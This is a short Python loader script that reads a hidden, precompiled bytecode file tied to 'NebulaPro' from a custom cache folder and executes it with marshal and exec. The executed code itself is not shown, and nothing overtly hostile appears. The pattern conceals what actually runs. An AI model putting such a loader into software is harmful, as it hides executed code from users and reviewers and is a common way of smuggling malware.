
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'NebulaPro_dfbf76f313024309b27be074b1be52b7.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
